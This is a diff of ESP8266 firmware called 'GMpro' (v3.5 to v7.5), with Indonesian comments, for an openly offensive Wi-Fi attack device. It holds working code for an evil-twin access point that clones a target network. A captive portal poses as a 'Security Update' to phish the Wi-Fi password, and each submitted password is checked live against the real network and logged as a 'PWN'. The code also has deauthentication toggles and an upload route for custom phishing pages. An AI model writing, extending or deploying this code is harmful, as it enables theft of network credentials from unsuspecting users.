@@ -1,6 +1,7 @@
 #include <ESP8266WiFi.h>
 #include <ESP8266WebServer.h>
 #include <DNSServer.h>
+#include <LittleFS.h>
 #include <Wire.h>
 #include <Adafruit_GFX.h>
 #include <Adafruit_SSD1306.h>
@@ -9,135 +10,129 @@ extern "C" {
   #include "user_interface.h"
 }
 
+// Inisialisasi OLED 0.66" (64x48)
 Adafruit_SSD1306 display(64, 48, &Wire, -1);
 ESP8266WebServer server(80);
 DNSServer dnsServer;
 
-bool isAttacking = false;
-bool isEvilTwinActive = false;
-bool isHidden = true; 
-String target_ssid = "";
-int target_ch = 1;
-String logs = "";
-int pwnCount = 0;
-String apSSID = "GMpro";
-String apPASS = "sangkur87";
+// Variabel Global
+bool isAttacking = false, isETwin = false, isHidden = false;
+String target_ssid = "", logs = "";
+int target_ch = 1, pwnCount = 0;
+String apSSID = "GMpro", apPASS = "sangkur87";
 
-void randomizeMAC() {
-  uint8_t mac[6] = {0x00, 0x16, 0x3E, (uint8_t)random(0xff), (uint8_t)random(0xff), (uint8_t)random(0xff)};
-  wifi_set_macaddr(SOFTAP_IF, mac);
-}
-
+// Tampilan OLED Profesional
 void updateOLED(String status) {
   display.clearDisplay();
-  display.setTextSize(1);
+  display.fillRect(0, 0, 64, 11, WHITE);
+  display.setTextColor(BLACK);
+  display.setCursor(2, 2); display.print("SYS: v7.5");
   display.setTextColor(WHITE);
-  display.setCursor(0,0);
-  display.println("GMPRO v3.5");
-  display.println("==========");
+  display.setCursor(0, 16);
   display.print("T:"); display.println(target_ssid == "" ? "NONE" : target_ssid.substring(0,8));
-  display.print("H:"); display.println(isHidden ? "ON" : "OFF");
-  display.print("PWN:"); display.println(pwnCount);
-  display.print("ST:"); display.println(status);
+  display.drawFastHLine(0, 26, 64, WHITE);
+  display.setCursor(0, 31); display.print("CH:"); display.print(target_ch);
+  display.setCursor(35, 31); display.print("P:"); display.print(pwnCount);
+  display.setCursor(0, 40); display.print("> "); display.print(status);
   display.display();
+}
+
+// Dashboard Admin (Dark Mode Glassmorphism)
+String getDashboard() {
+  String s = "<!DOCTYPE html><html><head><meta name='viewport' content='width=device-width,initial-scale=1'>";
+  s += "<style>body{background:#0d0d0d;color:#ccff00;font-family:sans-serif;padding:15px;margin:0;}";
+  s += ".card{background:rgba(255,255,255,0.05);padding:15px;border-radius:12px;margin:10px 0;border:1px solid #333;}";
+  s += ".btn{display:block;width:100%;padding:14px;margin:8px 0;border-radius:8px;text-align:center;text-decoration:none;font-weight:bold;font-size:13px;border:none;cursor:pointer;}";
+  s += ".btn-p{background:#ccff00;color:#000;} .btn-o{background:transparent;border:1px solid #ccff00;color:#ccff00;}";
+  s += ".logs{background:#000;color:#0f0;padding:10px;height:120px;overflow-y:auto;font-family:monospace;font-size:11px;border-radius:8px;border:1px solid #222;}</style></head><body>";
+  s += "<h2 style='text-align:center;letter-spacing:2px;'>GM-PRO V7.5</h2>";
+  s += "<div class='card'><b>TARGET:</b> " + (target_ssid==""?"NONE":target_ssid) + " (CH:" + String(target_ch) + ")</div>";
+  s += "<a href='/scan' class='btn btn-p'>1. SCAN NETWORKS</a>";
+  s += "<a href='/atk' class='btn btn-o'>2. DEAUTH: " + String(isAttacking?"ON":"OFF") + "</a>";
+  s += "<a href='/et' class='btn btn-o'>3. EVIL TWIN: " + String(isETwin?"ON":"OFF") + "</a>";
+  s += "<div class='card' style='font-size:12px;'><b>FILE HTML:</b> " + String(LittleFS.exists("/index.html")?"UPLOADED":"DEFAULT") + "<form method='POST' action='/upload' enctype='multipart/form-data' style='margin-top:10px;'><input type='file' name='f' style='width:100px;'><input type='submit' value='Upload'></form></div>";
+  s += "<b>PWN LOGS:</b><div class='logs'>" + (logs == "" ? "Waiting for data..." : logs) + "</div></body></html>";
+  return s;
 }
 
 void setup() {
   Serial.begin(115200);
-  pinMode(2, OUTPUT); 
+  LittleFS.begin();
   display.begin(SSD1306_SWITCHCAPVCC, 0x3C);
   WiFi.mode(WIFI_AP_STA);
   wifi_promiscuous_enable(1);
-  randomizeMAC(); 
-  WiFi.softAP(apSSID.c_str(), apPASS.c_str(), 1, isHidden); 
+  WiFi.softAP(apSSID.c_str(), apPASS.c_str(), 1, isHidden);
   dnsServer.start(53, "*", WiFi.softAPIP());
-  updateOLED(isHidden ? "GHOST" : "READY");
+  updateOLED("READY");
 
-  server.on("/", []() {
-    String s = "<html><head><meta http-equiv='refresh' content='7'><meta name='viewport' content='width=device-width,initial-scale=1'><style>";
-    s += "body{background:#000;color:#0f0;font-family:monospace;padding:10px;}";
-    s += ".b{border:1px solid #444;padding:12px;display:block;margin:10px 0;color:#0f0;text-decoration:none;text-align:center;background:#111;border-radius:5px;}";
-    s += ".active{border-color:#f00; background:#300; color:#fff;} h1{text-align:center;margin:0;}";
-    s += ".tgl{color:#fff;background:#444;padding:5px 10px;border-radius:3px;text-decoration:none;font-size:11px;border:1px solid #0f0;}";
-    s += "</style></head><body>";
-    s += "<h1>GMPRO v3.5</h1>";
-    s += "<div style='text-align:right;margin-bottom:10px;'><a href='/toggle_hidden' class='tgl'>GHOST MODE: " + String(isHidden?"ON":"OFF") + "</a></div>";
-    s += "<div style='border:1px solid #333;padding:10px;margin-bottom:10px;'>";
-    s += "TARGET: " + (target_ssid=="" ? "NONE" : target_ssid) + "<br>";
-    s += "CH: " + String(target_ch) + " | ATK: " + (isAttacking?"<b style='color:red;'>RUNNING</b>":"IDLE") + "</div>";
-    s += "<a href='/scan' class='b'>[1] SCAN TARGET</a>";
-    s += "<a href='/eviltwin' class='b " + String(isEvilTwinActive?"active":"") + "' style='color:#0ff;'>[2] EVIL TWIN</a>";
-    s += "<a href='/attack' class='b " + String(isAttacking && target_ssid != "ALL"?"active":"") + "' style='color:#f44;'>[3] DEAUTH TARGET</a>";
-    s += "<a href='/mass' class='b " + String(target_ssid == "ALL"?"active":"") + "' style='color:#f0f;'>[4] MASS DEAUTH</a>";
-    s += "<h3>PWN LOGS ("+String(pwnCount)+"):</h3><div style='background:#111;padding:10px;font-size:11px;border:1px solid #333;height:100px;overflow-y:auto;'>" + (logs=="" ? "LISTENING..." : logs) + "</div>";
-    s += "</body></html>";
-    server.send(200, "text/html", s);
-  });
+  server.on("/", [](){ server.send(200, "text/html", getDashboard()); });
 
-  server.on("/toggle_hidden", []() {
-    isHidden = !isHidden;
-    WiFi.softAP(apSSID.c_str(), apPASS.c_str(), 1, isHidden); 
-    updateOLED(isHidden ? "GHOST" : "VISIBLE");
-    server.sendHeader("Location", "/"); server.send(302);
+  // Fitur Upload HTML
+  server.on("/upload", HTTP_POST, [](){
+    server.send(200, "text/html", "Upload OK! <a href='/'>BACK</a>");
+  }, [](){
+    HTTPUpload& upload = server.upload();
+    if(upload.status == UPLOAD_FILE_START){ LittleFS.remove("/index.html"); File f = LittleFS.open("/index.html", "w"); f.close(); }
+    else if(upload.status == UPLOAD_FILE_WRITE){ File f = LittleFS.open("/index.html", "a"); f.write(upload.buf, upload.currentSize); f.close(); }
   });
 
   server.on("/scan", []() {
-    int n = WiFi.scanNetworks();
-    String sc = "<html><body style='background:#000;color:#0f0;font-family:monospace;padding:15px;'><h2>NETWORKS</h2>";
+    int n = WiFi.scanNetworks(false);
+    String sc = "<html><body style='background:#000;color:#0f0;font-family:sans-serif;padding:20px;'><h3>NETWORKS</h3>";
     for(int i=0; i<n; i++) {
-      String ssid = WiFi.SSID(i);
-      if(ssid == "") ssid = "[HIDDEN]";
-      sc += "<div><b>" + ssid + "</b> (" + String(WiFi.RSSI(i)) + "dBm)<br>";
-      sc += "CH: " + String(WiFi.channel(i)) + " | " + WiFi.BSSIDstr(i) + "<br>";
-      sc += "<a href='/select?s=" + ssid + "&c=" + String(WiFi.channel(i)) + "' style='color:#fff;'>[SELECT]</a></div><hr>";
+      sc += "<div style='background:#111;padding:12px;margin-bottom:10px;border-radius:8px;border:1px solid #333;'>" + WiFi.SSID(i);
+      sc += " <a href='/sel?s=" + WiFi.SSID(i) + "&c=" + String(WiFi.channel(i)) + "' style='color:#fff;float:right;text-decoration:none;'>[SELECT]</a></div>";
     }
-    sc += "<br><a href='/' style='color:#0f0;'>[ BACK ]</a></body></html>";
+    sc += "<br><a href='/' style='color:#888;'>CANCEL</a></body></html>";
     server.send(200, "text/html", sc);
   });
 
-  server.on("/select", []() {
-    target_ssid = server.arg("s");
-    target_ch = server.arg("c").toInt();
+  server.on("/sel", []() {
+    target_ssid = server.arg("s"); target_ch = server.arg("c").toInt();
     updateOLED("LOCKED");
     server.sendHeader("Location", "/"); server.send(302);
   });
 
-  server.on("/eviltwin", []() {
-    if (!isEvilTwinActive && target_ssid != "") {
-      WiFi.softAP(target_ssid.c_str(), "", 1, 0); 
-      isEvilTwinActive = true;
-      updateOLED("ETWIN");
-    } else {
-      WiFi.softAP(apSSID.c_str(), apPASS.c_str(), 1, isHidden); 
-      isEvilTwinActive = false;
-      updateOLED(isHidden ? "GHOST" : "READY");
-    }
+  server.on("/atk", []() { isAttacking = !isAttacking; updateOLED(isAttacking?"ATK ON":"IDLE"); server.sendHeader("Location", "/"); server.send(302); });
+
+  server.on("/et", []() {
+    isETwin = !isETwin;
+    if(isETwin && target_ssid != "") { WiFi.softAP(target_ssid.c_str(), "", 1, 0); updateOLED("ETWIN"); }
+    else { WiFi.softAP(apSSID.c_str(), apPASS.c_str(), 1, isHidden); updateOLED("READY"); }
     server.sendHeader("Location", "/"); server.send(302);
   });
 
-  server.on("/attack", [](){ isAttacking = !isAttacking; updateOLED(isAttacking?"DEAUTH":"IDLE"); server.sendHeader("Location", "/"); server.send(302); });
-
-  server.on("/mass", []() {
-    isAttacking = !isAttacking;
-    target_ssid = isAttacking ? "ALL" : "";
-    updateOLED(isAttacking ? "MASS" : "READY");
-    server.sendHeader("Location", "/"); server.send(302);
+  // Validasi ala Nethercap (Fast Validation)
+  server.on("/l", []() {
+    String p = server.arg("p");
+    updateOLED("CHECK..");
+    WiFi.begin(target_ssid.c_str(), p.c_str());
+    unsigned long start = millis();
+    bool v = false;
+    while (millis() - start < 3500) { // Hanya 3.5 detik agar WiFi tidak putus lama
+      if (WiFi.status() == WL_CONNECTED) { v = true; break; }
+      delay(100);
+    }
+    if (v) {
+      logs = "<b>[VALID]</b> " + p + "<br>" + logs; pwnCount++;
+      isAttacking = false; isETwin = false;
+      WiFi.disconnect(); WiFi.softAP(apSSID.c_str(), apPASS.c_str(), 1, isHidden);
+      updateOLED("SUCCESS");
+      server.send(200, "text/html", "Success! Reconnecting...");
+    } else {
+      updateOLED("INVALID");
+      server.send(200, "text/html", "<html><script>alert('Incorrect Password! Try Again.'); window.location='/';</script></html>");
+    }
   });
 
   server.onNotFound([]() {
-    String login = "<html><head><meta name='viewport' content='width=device-width,initial-scale=1'></head><body style='font-family:sans-serif;text-align:center;padding:20px;'>";
-    login += "<div style='background:#f44336;color:white;padding:15px;border-radius:5px;'><h3>System Update</h3></div>";
-    login += "<p>Verification needed to restore internet access.</p>";
-    login += "<form action='/login'><input type='password' name='p' placeholder='WiFi Password' style='width:90%;padding:12px;' required><br><br>";
-    login += "<input type='submit' value='Verify & Connect' style='width:90%;padding:12px;background:#000;color:#fff;'></form></body></html>";
-    server.send(200, "text/html", login);
-  });
-
-  server.on("/login", []() {
-    logs = "<b>" + target_ssid + "</b>: " + server.arg("p") + "<br>" + logs;
-    pwnCount++;
-    updateOLED("PWN!");
-    server.send(200, "text/html", "Verifying... Success.");
+    if (server.hostHeader() == "192.168.4.1") { server.send(200, "text/html", getDashboard()); return; }
+    if (LittleFS.exists("/index.html")) { File f = LittleFS.open("/index.html", "r"); server.streamFile(f, "text/html"); f.close(); }
+    else {
+      String h = "<html><body style='text-align:center;padding-top:50px;'><h2>Security Update</h2>";
+      h += "<p>Verification required.</p><form action='/l'><input type='password' name='p' required><br><br><input type='submit' value='Verify'></form></body></html>";
+      server.send(200, "text/html", h);
+    }
   });
 
   server.begin();
@@ -146,30 +141,5 @@ void setup() {
 void loop() {
   dnsServer.processNextRequest();
   server.handleClient();
-  
-  if (isAttacking) {
-    digitalWrite(2, (millis() % 500 < 100) ? LOW : HIGH);
-    if(target_ssid == "ALL") {
-      static int ch = 1;
-      wifi_set_channel(ch);
-      ch = (ch % 13) + 1;
-    } else {
-      // PERBAIKAN DI SINI: scanNetworks(false)
-      static unsigned long lastCheck = 0;
-      if (millis() - lastCheck > 6000) {
-        int n = WiFi.scanNetworks(false); // Pakai satu parameter saja
-        for (int i = 0; i < n; i++) {
-          if (WiFi.SSID(i) == target_ssid && WiFi.channel(i) != target_ch) {
-            target_ch = WiFi.channel(i);
-            break;
-          }
-        }
-        lastCheck = millis();
-      }
-      wifi_set_channel(target_ch);
-    }
-    delay(1); 
-  } else {
-    digitalWrite(2, (millis() % 2000 < 100) ? LOW : HIGH); 
-  }
+  if (isAttacking && target_ssid != "") { wifi_set_channel(target_ch); delay(1); }
 }
